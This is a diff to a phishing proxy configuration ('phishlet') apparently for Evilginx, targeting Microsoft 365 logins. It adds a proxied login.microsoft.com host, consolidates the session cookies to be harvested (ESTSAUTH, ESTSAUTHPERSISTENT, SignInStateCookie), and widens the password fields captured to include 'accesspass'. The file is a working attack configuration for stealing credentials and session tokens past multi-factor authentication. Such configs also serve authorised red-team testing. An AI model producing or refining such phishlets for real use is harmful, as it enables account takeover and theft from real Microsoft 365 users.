@@ -1,9 +1,10 @@
 name: 'o365'
-author: '@jamescullum'
-min_ver: '2.3.0'
+author: '@BakkerJan'
+min_ver: '2.3.1'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: true, is_landing: true}
   # The lines below are needed if your target organization utilizes ADFS.
   # If they do, you need to uncomment all following lines that contain <...>
   # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
@@ -20,16 +21,14 @@ sub_filters:
   #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
-  - domain: 'login.microsoftonline.com'
-    keys: ['SignInStateCookie']
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
 credentials:
   username:
     key: '(login|UserName)'
     search: '(.*)'
     type: 'post'
   password:
-    key: '(passwd|Password)'
+    key: '(passwd|Password|accesspass)'
     search: '(.*)'
     type: 'post'
 login:
